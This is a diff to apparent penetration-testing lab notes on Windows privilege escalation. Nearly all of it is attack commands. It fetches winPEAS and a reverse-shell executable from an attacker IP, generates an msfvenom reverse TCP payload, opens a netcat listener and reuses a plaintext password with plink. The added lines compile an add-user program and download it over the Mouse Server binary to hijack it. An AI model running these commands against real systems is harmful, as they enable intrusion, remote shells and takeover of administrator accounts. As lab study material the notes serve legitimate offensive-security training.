@@ -256,7 +256,7 @@ iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
 
 # find zachary is an admin
 # we can write to C:\Users\Public
-C:\Program Files (x86)\Mouse Server\Mouse Server Luminati.exe
+C:\"Program Files (x86)"\"Mouse Server"\Mouse Server Luminati.exe
 type C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
 
@@ -279,6 +279,19 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f exe
 nc -nvlp 9999
 iwr -uri http://192.168.45.219/shell.exe -Outfile shell.exe
 
+- [ ] # NOTE that I need none of this, i just needed to run cmd as administrator to get the flag in Administrator's Desktop
+# mouseserver is not a service, but a process
+Get-Process
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+# verify that we see activity
+iwr -uri http://192.168.45.219/Watch-Command.ps1 -Outfile Watch-Command.ps1
+Import-Module C:\Users\zachary\Watch-Command.ps1
+Get-Process "MouseServer" -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
+
+x86_64-w64-mingw32-gcc adduser.c -o /home/kali/lab1/adduser.exe
+cd C:\"Program Files (x86)"\"Mouse Server"
+iwr -uri http://192.168.45.219/adduser.exe -Outfile MouseServer.exe
 ```
 
 .142
